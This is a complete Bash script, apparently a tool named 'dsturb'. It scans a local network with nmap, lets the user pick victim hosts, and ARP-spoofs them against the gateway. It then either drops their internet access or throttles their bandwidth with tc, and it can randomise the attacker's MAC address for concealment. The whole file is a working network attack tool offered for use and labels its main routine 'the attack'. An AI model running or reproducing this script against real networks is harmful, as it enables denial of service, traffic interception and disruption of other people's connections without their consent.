#!/bin/bash

# Script version
VERSION=3.5

#
#   Author: R7FX    (github.com/avivbintangaringga)
#           MrSyhd  (github.com/syahidnurrohim)
#
#   This program is free software: you can redistribute it and/or modify
#   it under the terms of the GNU General Public License as published by
#   the Free Software Foundation, either version 3 of the License, or
#   (at your option) any later version.
#
#   This program is distributed in the hope that it will be useful,
#   but WITHOUT ANY WARRANTY; without even the implied warranty of
#   MERCHANTABILITY or FITNESS FOR A PARTICULAR PURPOSE.  See the
#   GNU General Public License for more details.
#
#   You should have received a copy of the GNU General Public License
#   along with this program.  If not, see <https://www.gnu.org/licenses/>.
#

# Required packages for script to run
REQUIREMENTS="arpspoof macchanger tc dhclient ifconfig"

# Terminal colors
RED="\033[0;31m"
GREEN="\033[0;32m"
NC="\033[0m"

# Display help
func_help()
{
    echo -e ""
    echo -e " Usage: $0 <options> [interface]"
    echo -e " "
    echo -e " Options:"
    echo -e "         -c  --connect                     Enable internet access on target"
    echo -e "         -d  --disconnect                  Disable internet access on target"
    echo -e "         -r  --randomize                   Randomize interface's MAC Address"
    echo -e "         -e  --exclude   [IP,IP,IP,...]    Exclude the following IP Addresses"
    echo -e "         -L  --limit     [rate-limit]      Limit bandwith for target"
    echo -e "         -h  --help                        Display help"
    echo -e " "
    echo -e "     Supported rate limit units:"
    echo -e "         b   ->  bits per second"
    echo -e "         k   ->  kilobits per second"
    echo -e "         m   ->  megabits per second"
    echo -e "         g   ->  gigabits per second"
    echo -e "         t   ->  terabits per second"
    echo -e "         B   ->  Bytes per second"
    echo -e "         K   ->  Kilobytes per second"
    echo -e "         M   ->  Megabytes per second"
    echo -e "         G   ->  Gigabytes per second"
    echo -e "         T   ->  Terabytes per second"
    echo -e "         (default: b)"
    echo -e " "
    echo -e "         e.g: 10K, 500K, 1M, 10M"
    echo -e ""
}

# Display header
func_header()
{
    clear
    echo -e ""
    echo -e ""
    echo -e "            /##             /##                         /##      "
    echo -e "           | ##            | ##                        | ##      "
    echo -e "       /#######  /######$ /######   /##   /##  /###### | ######$ "
    echo -e "      /##__  ## /##_____/|_  ##_/  | ##  | ## /##__  ##| ##__  ##"
    echo -e "     | ##  | ##|  ######   | ##    | ##  | ##| ##  \__/| ##  \ ##"
    echo -e "     | ##  | ## \____  ##  | ## /##| ##  | ##| ##      | ##  | ##"
    echo -e "     |  ####### /#######/  |  ####/|  ######/| ##      | #######/"
    echo -e "      \_______/|_______/    \___/   \______/ |__/      |_______/ "
    echo -e ""
    echo -e "      Author: R7FX, MrSyhd                             version $VERSION"
    echo -e ""
    echo -e ""
}

# Validate IP Address
func_check_ip()
{
    # Initiate local IP variable
    local IP=$1

    # Initiate the result to be false (1)
    local RESULT=1

    # Check through every IP Address bytes if it is a number or not
    if [[ $IP =~ ^[0-9]{1,3}\.[0-9]{1,3}\.[0-9]{1,3}\.[0-9]{1,3}$ ]]
    then
        # Split every bytes to an array
        IP=($(echo $IP | tr '.' '\n'))

        # Check every bytes value is in correct format (less than 255) and assign the result to the RESULT variable
        [[ ${IP[0]} -le 255 && ${IP[1]} -le 255 && ${IP[2]} -le 255 && ${IP[3]} -le 255 ]]
        RESULT=$?
    fi

    # Return the result
    return $RESULT
}

# Check limit rate format
func_check_rate_limit()
{
    local LIMIT=$(echo $RATE_LIMIT | tr -dC '[:alnum:]' | tr -d '[:alpha:]')
    local UNIT=$(echo $RATE_LIMIT | tr -dC '[:alnum:]' | tr -d '[:digit:]')

    # No number is given, return false
    [[ -z $LIMIT ]] && return 1

    case $UNIT in
        b) RATE_LIMIT="${LIMIT}bit";;
        k) RATE_LIMIT="${LIMIT}kbit";;
        m) RATE_LIMIT="${LIMIT}mbit";;
        g) RATE_LIMIT="${LIMIT}gbit";;
        t) RATE_LIMIT="${LIMIT}tbit";;
        B) RATE_LIMIT="${LIMIT}bps";;
        K) RATE_LIMIT="${LIMIT}kbps";;
        M) RATE_LIMIT="${LIMIT}mbps";;
        G) RATE_LIMIT="${LIMIT}gbps";;
        T) RATE_LIMIT="${LIMIT}tbps";;
        *) RATE_LIMIT="${LIMIT}";;
    esac

    # All is good
    return 0
}

# Checking package requirements
func_check_prerequires()
{
    # Assume all packages is installed
    PACKAGE_NOT_INSTALLED=false

    # Loop through each required packages
	for PACKAGE in $REQUIREMENTS
	do
        # Check if requirements is installed with 'hash' command 
        # Exit code should be 0 if it is installed and 1 if it isn't
        if ! hash $PACKAGE 2>/dev/null
        then
            # Display error message
            echo -e "ERR: ${RED}$PACKAGE is not installed!$NC\n"
            # Add package not installed flag
            PACKAGE_NOT_INSTALLED=true
        fi
    done

    # Exit if any of the requirements isn't installed
    [[ $PACKAGE_NOT_INSTALLED == true ]] && exit 1
}

# Do some cleanup
func_cleanup()
{
    echo -e "\n\n[*] Please wait for the cleanup process to be finished...\n\n"

    # Get all child process PIDs (arpspoof)
    local PIDS=$(jobs -pr)

    # Kill all child process
    [[ ! -z $PIDS ]] && kill $PIDS

    # Wait for all child background process to fully finish
    wait

    # Remove rate limitting
    tc qdisc del dev $INTERFACE root > /dev/null 2>&1

    # Restore to original MAC Address if MAC Randomization enabled
    [[ ! -z $RANDOMIZE_MAC ]] && if $RANDOMIZE_MAC
    then

        echo -e "\n\n[*] Restoring to original MAC Address....\n\n"

        # Turn interface down
        ifconfig $INTERFACE down > /dev/null 2>&1

        # Turn back to original MAC Address
        macchanger -p $INTERFACE > /dev/null 2>&1

        # Turn interface back up
        ifconfig $INTERFACE up > /dev/null 2>&1 

        # Requesting new IP Address
        dhclient $INTERFACE > /dev/null 2>&1 
    fi

    # Restore terminal screen
    tput rmcup

    # Finally exit
    exit 0
}

# Randomize MAC Address
func_randomize_mac()
{
    func_header

    echo -e "[*] Randomizing MAC Address of interface \"$INTERFACE\""

    # Turn interface down
    ifconfig $INTERFACE down > /dev/null 2>&1

    # Randomize MAC Address
    macchanger -r $INTERFACE > /dev/null 2>&1

    # Turn interface back up
    ifconfig $INTERFACE up > /dev/null 2>&1

    # Get new MAC Address
    read NEW_MAC </sys/class/net/$INTERFACE/address

    echo -e "[*] New MAC Address: $NEW_MAC"
    echo -e "[*] Waiting until connected to a network..."

    # Request new IP Address to DHCP Server
    dhclient $INTERFACE > /dev/null 2>&1
}

# Start rate limitting
func_rate_limit()
{
    # Add limitting rule
    tc qdisc add dev $INTERFACE root handle 1: htb default 30
    tc class add dev $INTERFACE parent 1: classid 1:1 htb rate $RATE_LIMIT
    tc class add dev $INTERFACE parent 1: classid 1:2 htb rate $RATE_LIMIT

    # Apply for all target IP
    for IP in $TARGET_IP
    do
        tc filter add dev $INTERFACE protocol ip parent 1:0 prio 1 u32 match ip dst $IP/32 flowid 1:1
        tc filter add dev $INTERFACE protocol ip parent 1:0 prio 1 u32 match ip src $IP/32 flowid 1:2
    done
}

# Scan network
func_scan_network()
{
    func_header
	
	# Print host length warning
	[[ $CIDR -lt 22 ]] && echo -e "[!] Large network detected, this scan may take minutes or hours"

    echo -e "[*] Scanning network $NETWORK..."

    # Scan all available IP Address in then network
    SCAN_RESULT=$(nmap -sn $NETWORK | grep "for" | cut -d ' ' -f 5-)

    # Exclude gateway IP and your own IP from the list
    for IP in $(echo "$GATEWAY $MY_IP")
    do
        SCAN_RESULT=$(echo "$SCAN_RESULT" | grep -vw "$IP")
    done

    # Iterate through the scan result
    local INDEX=1
    while read -r IP_AND_HOSTNAME
    do
        # Get IP Address
        IP=$(echo $IP_AND_HOSTNAME | cut -d '(' -f2 | cut -d ')' -f1)

        # Get Hostname
        HOSTNAME=$(echo $IP_AND_HOSTNAME | cut -d ' ' -f1)

        # Assign scanned host with hostname if available
        [[ $IP == $HOSTNAME ]] && HOSTS[$INDEX]=$(printf "%s\n" $IP) || HOSTS[$INDEX]=$(printf "%-20s (%s)\n" $IP $HOSTNAME)
        let 'INDEX++'
    done < <(echo "$SCAN_RESULT")

    # No IP address on the network, prompting to rescan
    if [[ -z $SCAN_RESULT ]]
    then
        echo -e "[!] No IP Address is detected on the network! Rescanning in 3 seconds... "
        sleep 3
        func_scan_network
    fi
}

# Start the attack :)
func_start_attack()
{
    func_header

    # No rate limit specified
    [[ -z $RATE_LIMIT ]] && RATE_LIMIT="Unlimited"

    echo -e " +"
    echo -e " | Target Network      : $NETWORK"
    echo -e " | Bandwidth Limit     : $RATE_LIMIT"
    echo -e " | Excluded IP Address : $EXCLUDED_IP"
    echo -e " +"
    echo -e ""

    # Block or forward internet access
    if [[ $FORWARD_TRAFFIC == true ]]
    then
        echo -e "[*] Forwarding internet access..."
        # Enabling IP Forwarding
        sysctl -q net.ipv4.ip_forward=1
    else
        echo -e "[*] Dropping internet access..."
        # Disabling IP Forwarding
        sysctl -q net.ipv4.ip_forward=0
    fi

    # Start the ARP Spoofing and print the output
    echo -e "[*] Attack Output:\n"

    for IP in $TARGET_IP
    do
        arpspoof -t $IP $GATEWAY &
        arpspoof -t $GATEWAY $IP &
    done

    # Loop so that the script isn't exit yet :v
    while true; do sleep 1; done
}

start_interactive_mode()
{
    # Open new terminal screen
    tput smcup

    # Trap func_cleanup so that it will be called if CTRL+C is fired or when script is killed
    trap func_cleanup SIGINT SIGTERM SIGKILL

    # Print header
    func_header
    echo -e "\nSelect Network Interface:\n"

    # Iterate all interface that connected to a network
    local INDEX=1
    while read -r IFACE
    do
        # Print it
        printf " %2s)  %-16s %s\n" $INDEX $IFACE

        # Assign the interface to an array
        IFACE_LIST[$INDEX]=$IFACE
        let 'INDEX++'
    done < <(ip -o -f inet addr show | awk '/scope global/ {printf "%20s (%s)\n",$2,$4}')

    # If no interface is connected to a network, then prompt to rescan
    if [[ -z ${IFACE_LIST[@]} ]]
    then
        read -n1 -p "[!] No interface is currently connected to any network! Scan again? [Y/n]: " SCAN_AGAIN

        case $SCAN_AGAIN in
            N|n) func_cleanup ;;
            *) func_select_interface ;;
        esac
    fi

    # Loop until input is correct
    while [[ -z $SELECTED_IFACE ]]
    do
        # When interface list is only 1, it will be selected as default so you don't have to choose
        [[ ${#IFACE_LIST[@]} == 1 ]] && SELECTED_IFACE=${IFACE_LIST[1]} && break

        echo -e ""
        read -p "[Select]: " SELECT

        SELECTED_IFACE=${IFACE_LIST[$SELECT]}
    done

    # Selected interface
    INTERFACE=$(echo $SELECTED_IFACE | cut -d ' ' -f1)

    # Selected network
    NETWORK=$(echo $SELECTED_IFACE | cut -d '(' -f2 | cut -d ')' -f1)

    # Prompt MAC Address randomization
    func_header
    read -n1 -p "[?] Do you want to randomize $INTERFACE MAC Address? [y/N]: " RANDOMIZE_MAC_PROMPT

    if [[ "$RANDOMIZE_MAC_PROMPT" == "y" || "$RANDOMIZE_MAC_PROMPT" == "Y" ]]
    then
        RANDOMIZE_MAC=true
        func_randomize_mac

        # Get new address after randomizing, in case it is different
        NETWORK=$(ip -o -f inet addr show $INTERFACE 2>&1 | awk '/scope global/ {printf "%s\n",$4}')
    fi

    # Get your IP Addresses and add to exclusion list
    MY_IP=$(ip -o -4 a | awk '{print $4 }' | cut -d '/' -f1 | grep -v ^127 | tr '\n' ' ')
    EXCLUDED_IP=$(echo "$MY_IP $EXCLUDED_IP" | tr ',' ' ')

    # Get gateway IP of interface
    GATEWAY=$(route -n | grep -w $INTERFACE | awk '{print $2}' | grep -v "0.0.0.0")
	
	# Store CIDR from the given gateway
	CIDR=$(echo $NETWORK | cut -d "/" -f2)

    # Just turn to <gateway>/<cidr> format, not really important
	NETWORK="$GATEWAY/$CIDR"

    # Scan the network
    func_scan_network

    # Print header
    func_header

    echo -e " +"
    echo -e " | Gateway     : $GATEWAY"
    echo -e " | Excluded IP : $EXCLUDED_IP"
    echo -e " +"
    echo -e ""
    echo -e "Select Target:\n"

    # Iterate all hosts found
    INDEX=1
    while [[ $INDEX -le ${#HOSTS[@]} ]]
    do
        # Print it
        printf " %3s)  %s\n" $INDEX "${HOSTS[$INDEX]}"

        # Assign the IP to an array
        IP_LIST[$INDEX]=$(echo "${HOSTS[$INDEX]}" | cut -d ' ' -f1)
        let 'INDEX++'
    done

    echo -e "   *)  All Addresses"
    echo -e ""
    read -p "[Select]: " SELECT_IP

    # If all address is selected
    if [[ ($SELECT_IP == "*" || -z $SELECT_IP) ]]
    then
        TARGET_IP="${IP_LIST[@]}"

        # If target is more than 1, then prompt to exclude IP
        if [[ ${#IP_LIST[@]} -gt 1 ]]
        then
            # Print header
            func_header

            # Prompt to exclude IP
            read -n1 -p "[?] Do you want to exclude IP Address? [y/N]: " EXCLUDE_PROMPT
            if [[ $EXCLUDE_PROMPT == "y" || $EXCLUDE_PROMPT == "Y" ]]
            then
                func_header

                echo -e " +"
                echo -e " | Gateway     : $GATEWAY"
                echo -e " | Excluded IP : $EXCLUDED_IP"
                echo -e " +"
                echo -e ""
                echo -e "Select IP Addresses you want to exclude:\n"

                local INDEX2=1
                while [[ $INDEX2 -le ${#HOSTS[@]} ]]
                do
                    printf " %3s)  %s\n" $INDEX2 "${HOSTS[$INDEX2]}"
                    let 'INDEX2++'
                done

                echo -e ""
                read -p "[Select]: " SELECT_EXCLUDE_IP

                # Remove excluded IP from target list
                for SELECTED in $(echo $SELECT_EXCLUDE_IP | tr ',' ' ')
                do
                    [[ $SELECTED -lt $INDEX2 ]] && TARGET_IP=$(echo $TARGET_IP | sed "s/\<${IP_LIST[$SELECTED]}\>//g")
                    EXCLUDED_IP="$EXCLUDED_UP ${IP_LIST[$SELECTED]}"
                done
    
                EXCLUDED_IP=$(echo $EXCLUDED_IP | tr -s ' ')
            fi
        fi
    else
        # Assign selected IP to target list
        for SELECTED in $(echo $SELECT_IP | tr ',' ' ')
        do
            [[ $SELECTED -lt $INDEX ]] && TARGET_IP="$TARGET_IP ${IP_LIST[$SELECTED]}"
        done
    fi

    func_header

    # Prompt to forward internet access
    read -n1 -p "[?] Forward internet access from client? [Y/n]: " FORWARD_PROMPT

    case $FORWARD_PROMPT in
        n|N) FORWARD_TRAFFIC=false ;;
        *) FORWARD_TRAFFIC=true;;
    esac

    # Prompt for bandwidth rate limitting if internet access is given
    if $FORWARD_TRAFFIC
    then
        func_header
        echo -e "Enter bandwidth rate limit for targets:"
        echo -e "   Supported Units: b, k, m, g, t, B, K, M, G, T  (default: b)"
        echo -e "   Leave empty to make unlimited rate"
        echo -e "   (e.g.: 500K)\n" 
        read -p "[Limit]: " RATE_LIMIT

        # Loop until correct format is inputted, and then start the limitting
        [[ ! -z $RATE_LIMIT ]] && while ! func_check_rate_limit
        do
            echo -e "\n[!] Invalid input!\n"
            read -p "[Limit]: " RATE_LIMIT
        done && func_rate_limit
    fi

    # Finally START THE ATTACK!!!
    func_start_attack
}

# Arpspoof is requiring root access
if [[ $EUID -ne 0 ]] 
then 
    sudo "$0" "$@"
    exit $?
fi

# Call function to check package requirements
func_check_prerequires

# Check network connection
if ! ping -q -w 1 -c 1 `ip r | grep default | cut -d ' ' -f 3` > /dev/null 2>&1
then
    echo -e "\n[!] Please check your network connection!\n"
    exit 1
fi

# Get Gateway IP Address
GATEWAY=$(route -n | grep -w $INTERFACE | awk '{print $2}' | grep -v "0.0.0.0")

NETWORK="$GATEWAY/$(echo $NETWORK | cut -d '/' -f2)"

# Get all of your IP Addresses and add to exclusion list
MY_IP=$(ip -o -4 a | awk '{print $4 }' | cut -d '/' -f1 | grep -v ^127 | tr '\n' ' ')
EXCLUDED_IP=$(echo "$MY_IP $EXCLUDED_IP" | tr ',' ' ' | tr -s ' ')

# If no argument is given, then run interactive mode
[[ -z $1 ]] && start_interactive_mode

# Get all options
OPTIONS=$(getopt -l "help,connect,disconnect,randomize,exclude:,limit:" -o "hcdre:L:" -a -- "$@")
eval set -- "$OPTIONS"

# Loop each options and add a flag
while true
do
    case $1 in
        -c|--connect) FORWARD_TRAFFIC=true ;;
        -d|--disconnect) FORWARD_TRAFFIC=false ;;
        -r|--randomize) RANDOMIZE_MAC=true ;;
        -e|--exclude) shift; [[ -z $1 ]] && func_help && exit 1; EXCLUDED_IP=$1;;
        -L|--limit) shift; [[ -z $1 ]] && func_help && exit 1; RATE_LIMIT=$1;;
        -h|--help) func_help && exit 0 ;;
        --) shift; [[ -z $1 ]] && func_help && exit 1; INTERFACE=$1; break;;
    esac
    shift
done

# Default values
[[ -z $FORWARD_TRAFFIC ]] && FORWARD_TRAFFIC=true
[[ -z $RANDOMIZE_MAC ]] && RANDOMIZE_MAC=false

# Check for interface availability
[[ ! -d /sys/class/net/$INTERFACE ]] && echo -e "\n[!] Interface \"$INTERFACE\" doesn't exist!\n" && exit 1

# Check rate limit format
if ! func_check_rate_limit
then
    echo -e "\n[!] Invalid rate limit!\n"
    func_help
    exit 1
fi

# Loop through all IP Addresses to validate IP Address format
[[ ! -z $EXCLUDED_IP ]] && for IP in "$EXCLUDED_IP"
do
    # Call the function to validate IP Address
    if ! func_check_ip $IP
    then
        echo -e "[!] Invalid IP Address: $IP"
        # Flag invalid IP Address
        INVALID_IP=true
    fi
done

# If there is an invalid IP Address then exit
[[ ! -z $INVALID_IP ]] && exit 1

# Get network address from interface
NETWORK=$(ip -o -f inet addr show $INTERFACE 2>&1 | awk '/scope global/ {printf "%s\n",$4}')
[[ -z $NETWORK ]] && echo -e "\n[!] Interface \"$INTERFACE\" doesn't connected to any network!\n" && exit 1

# Open new terminal screen
tput smcup

# Trap func_cleanup on Interrupt (CTRL+C), Terminate, and Kill signal
trap func_cleanup SIGINT SIGTERM SIGKILL

if $RANDOMIZE_MAC
then
    func_randomize_mac
    NETWORK=$(ip -o -f inet addr show $INTERFACE 2>&1 | awk '/scope global/ {printf "%s\n",$4}')
fi

# Scan the network
func_scan_network

# Assign scanned hosts to target list
for HOST in "${HOSTS[@]}"
do
    IP=$(echo "$HOST" | cut -d ' ' -f1)
    TARGET_IP="$TARGET_IP $IP"
done

# Remove excluded IP from target list
for IP in $EXCLUDED_IP
do
    TARGET_IP=$(echo "$TARGET_IP" | sed "s/\<$IP\>//g")
done

# Start rate limitting if enabled
[[ ! -z $RATE_LIMIT ]] && func_rate_limit

# Finally START THE ATTACK!!!
func_start_attack
